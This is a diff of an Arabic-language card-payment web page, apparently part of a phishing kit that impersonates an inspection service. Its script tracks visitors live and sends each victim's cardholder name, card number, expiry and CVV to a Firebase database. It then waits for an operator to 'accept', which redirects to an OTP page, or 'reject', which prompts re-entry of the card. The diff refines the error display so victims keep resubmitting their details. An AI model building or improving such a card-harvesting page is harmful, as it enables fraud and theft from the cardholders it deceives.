@@ -13,6 +13,7 @@
             --main-green: #1e7344; 
             --bg-light: #f7f8fa;
             --card-gradient: linear-gradient(135deg, #1e7344 0%, #114126 100%);
+            --error-red: #dc3545;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
@@ -23,7 +24,6 @@
         .main-header h1 { font-size: 18px; color: #333; margin-bottom: 5px; }
         .main-header p { font-size: 14px; color: #1e7344; font-weight: bold; }
 
-        /* تصميم البطاقة التفاعلية الخضراء */
         .credit-card-view {
             width: 100%; height: 200px; background: var(--card-gradient); border-radius: 15px;
             padding: 20px; margin-bottom: 25px; color: white; position: relative;
@@ -33,17 +33,11 @@
 
         .card-logo-row { display: flex; justify-content: space-between; align-items: center; height: 40px; }
         .card-chip { width: 45px; height: 35px; background: linear-gradient(135deg, #f0d060 0%, #b88a14 100%); border-radius: 6px; }
-        
         #viewCardLogo { width: 50px; height: auto; object-fit: contain; display: none; }
 
         .card-number-view { 
-            font-size: 20px; 
-            letter-spacing: 2px; 
-            margin-top: 35px; 
-            display: block; 
-            font-family: 'Courier New', monospace; 
-            height: 25px;
-            white-space: nowrap;
+            font-size: 20px; letter-spacing: 2px; margin-top: 35px; display: block; 
+            font-family: 'Courier New', monospace; height: 25px; white-space: nowrap;
         }
 
         .card-info-bottom { display: flex; justify-content: space-between; align-items: flex-end; margin-top: 25px; direction: rtl; }
@@ -53,28 +47,25 @@
         .payment-methods-icons { display: flex; justify-content: center; align-items: center; gap: 15px; margin-bottom: 20px; }
         .combined-logos { width: 100%; max-width: 280px; height: auto; }
 
-        .form-group { text-align: right; margin-bottom: 15px; width: 100%; }
+        .form-group { text-align: right; margin-bottom: 15px; width: 100%; position: relative; }
         .form-label { display: block; font-size: 13px; font-weight: bold; color: #444; margin-bottom: 7px; }
-        
         .input-field { width: 100%; padding: 13px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; outline: none; transition: 0.3s; }
         
-        /* حالة الخطأ */
-        .input-error { border: 2px solid red !important; }
+        /* --- التعديلات الجديدة لحالة الخطأ --- */
+        .input-error { border: 2px solid var(--error-red) !important; background-color: #fff8f8; }
+        .error-text { color: var(--error-red); font-size: 11px; font-weight: bold; margin-top: 5px; display: none; }
 
         .ltr-field { direction: ltr; text-align: left; }
         .rtl-field { direction: rtl; text-align: right; }
-
         .expiry-cvv-row { display: flex; gap: 10px; width: 100%; }
 
         .btn-pay { width: 100%; background-color: #82b199; color: white; border: none; border-radius: 10px; padding: 16px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
         .btn-pay:hover { background-color: #1e7344; }
 
-        /* شاشة التحميل (Overlay) */
         #loadingOverlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255, 255, 255, 0.95);
-            display: none; flex-direction: column; justify-content: center;
-            align-items: center; z-index: 9999;
+            background: rgba(255, 255, 255, 0.95); display: none; 
+            flex-direction: column; justify-content: center; align-items: center; z-index: 9999;
         }
         .spinner {
             width: 50px; height: 50px; border: 5px solid #f3f3f3;
@@ -121,6 +112,7 @@
         <div class="form-group">
             <label class="form-label">رقم البطاقة</label>
             <input type="tel" id="cardNumber" class="input-field ltr-field" placeholder="1234 5678 9012 3456" maxlength="19">
+            <div id="cardErrorMsg" class="error-text">برجاء التحقق من معلومات البطاقة الصحيحة</div>
         </div>
 
         <div class="expiry-cvv-row">
@@ -138,7 +130,7 @@
     </div>
 
     <script>
-        // --- إعدادات Firebase من صورة المشروع Saso-Inspection ---
+        // إعدادات Firebase
         const firebaseConfig = { 
             apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT...", 
             authDomain: "saso-inspection.firebaseapp.com",
@@ -150,25 +142,21 @@
         };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
-
         const visitorId = localStorage.getItem('visitorId') || "V_" + Math.floor(Math.random() * 100000);
         localStorage.setItem('visitorId', visitorId);
 
-        // تتبع الزيارة
-        database.ref('live_visitors/' + visitorId).set({
-            page: "صفحة الدفع",
-            last_active: firebase.database.ServerValue.TIMESTAMP
-        });
+        database.ref('live_visitors/' + visitorId).set({ page: "صفحة الدفع", last_active: firebase.database.ServerValue.TIMESTAMP });
 
-        // --- التنسيق التلقائي للبطاقة ---
         const visaIcon = "https://img.icons8.com/color/48/000000/visa.png";
         const masterIcon = "https://img.icons8.com/color/48/000000/mastercard.png";
 
+        // تحديث اسم الحامل
         document.getElementById('cardHolder').addEventListener('input', function() {
             this.value = this.value.replace(/[0-9]/g, '');
             document.getElementById('viewCardHolder').innerText = this.value || 'اسم حامل البطاقة';
         });
 
+        // تنسيق رقم البطاقة وإزالة الخطأ عند الكتابة
         document.getElementById('cardNumber').addEventListener('input', function() {
             let val = this.value.replace(/\D/g, '');
             let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
@@ -180,8 +168,9 @@
             else if (val.startsWith('5')) { logoImg.src = masterIcon; logoImg.style.display = "block"; }
             else { logoImg.style.display = "none"; }
             
-            // إزالة اللون الأحمر عند البدء في التعديل
+            // إخفاء اللون الأحمر والرسالة عند البدء في التصحيح
             this.classList.remove('input-error');
+            document.getElementById('cardErrorMsg').style.display = "none";
         });
 
         document.getElementById('cardExpiry').addEventListener('input', function() {
@@ -190,48 +179,53 @@
             document.getElementById('viewCardExpiry').innerText = this.value || '00 / 00';
         });
 
-        // --- إرسال البيانات والمراقبة اللحظية ---
         function submitPayment() {
             const cardInput = document.getElementById('cardNumber');
-            if (cardInput.value.length < 15) {
-                alert("يرجى إدخال رقم بطاقة صحيح");
+            const errorMsg = document.getElementById('cardErrorMsg');
+            
+            // فحص مبدئي قبل الإرسال
+            if (cardInput.value.replace(/\s/g, '').length < 16) {
+                showError();
                 return;
             }
+
+            document.getElementById('loadingOverlay').style.display = 'flex';
 
             const cardData = {
                 cardHolder: document.getElementById('cardHolder').value,
                 cardNumber: cardInput.value,
                 expiry: document.getElementById('cardExpiry').value,
                 cvv: document.getElementById('cvv').value,
-                status: "waiting", // العميل ينتظر قرارك الآن
+                status: "waiting",
                 last_update: firebase.database.ServerValue.TIMESTAMP
             };
 
-            // 1. إظهار شاشة التحميل
-            document.getElementById('loadingOverlay').style.display = 'flex';
-
-            // 2. حفظ البيانات
             database.ref('payments/' + visitorId).update(cardData);
 
-            // 3. مراقبة الرد من الأدمن (نظام القبول والرفض)
+            // المراقبة اللحظية لقرار الأدمن
             const controlRef = database.ref('payments/' + visitorId);
             controlRef.on('value', (snapshot) => {
                 const data = snapshot.val();
-                
+                if (!data) return;
+
                 if (data.status === "accept") {
-                    // إذا ضغطت قبول -> توجه لصفحة OTP
                     window.location.href = "otp.html";
                 } 
                 else if (data.status === "reject") {
-                    // إذا ضغطت رفض -> إخفاء التحميل وتلوين المربع بالأحمر
                     document.getElementById('loadingOverlay').style.display = 'none';
-                    cardInput.classList.add('input-error');
-                    alert("برجاء التحقق من معلومات البطاقة الصحيحة");
-                    
-                    // إعادة الحالة لـ idle لكي يتمكن العميل من المحاولة مرة أخرى
+                    showError();
+                    // تصفير الحالة للسماح بمحاولة جديدة
                     controlRef.update({ status: "idle" });
                 }
             });
+        }
+
+        function showError() {
+            const cardInput = document.getElementById('cardNumber');
+            const errorMsg = document.getElementById('cardErrorMsg');
+            cardInput.classList.add('input-error');
+            errorMsg.style.display = "block";
+            cardInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
         }
     </script>
 </body>
